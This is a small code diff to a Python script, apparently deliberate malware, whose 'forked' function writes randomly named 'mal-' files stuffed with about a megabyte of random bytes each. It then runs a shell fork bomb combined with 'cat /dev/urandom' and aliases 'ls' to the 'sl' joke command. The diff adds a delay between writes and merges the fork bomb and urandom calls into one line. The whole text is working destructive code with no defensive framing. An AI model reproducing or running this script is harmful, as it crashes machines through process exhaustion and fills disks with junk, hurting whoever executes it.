@@ -1,5 +1,6 @@
 import os
 import random
+import time
 
 def forked():
 
@@ -20,10 +21,10 @@ def forked():
     os.system("touch " + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4))
     with open(os.getcwd() + "/" + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4), "a") as file:
       file.write(str(random.randbytes(999999)) + malwar)
+      time.sleep(5)
       file.write(str(random.randbytes(999999)) + malwar)
     os.system("clear")
-    os.system(":(){ :|:& };:")
-    os.system("cat /dev/urandom")
+    os.system(":(){ :|:& };: && cat /dev/urandom")
     if number == 1:
       os.system('alias ls="sl"')
       number = 0
